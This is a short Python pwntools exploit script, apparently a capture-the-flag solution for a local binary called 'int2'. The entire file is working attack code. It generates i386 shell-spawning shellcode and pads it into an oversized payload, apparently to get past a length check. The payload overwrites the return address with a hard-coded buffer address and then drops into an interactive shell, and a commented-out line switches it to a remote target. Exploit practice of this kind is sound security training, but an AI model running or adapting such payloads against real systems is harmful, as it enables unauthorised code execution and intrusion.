from pwn import *

p = process('./int2')
#p = remote('ip','port')
context.log_level = 'debug'

passwd_buf_addr = 0x0804A060 
shellcode = shellcraft.i386.sh()

p.recvuntil("wd:\n")     
payload = asm(shellcode).ljust(0x3b+4,'a')+p32(passwd_buf_addr)+'a'*194  #63+4+194=261
p.send(payload)
p.interactive()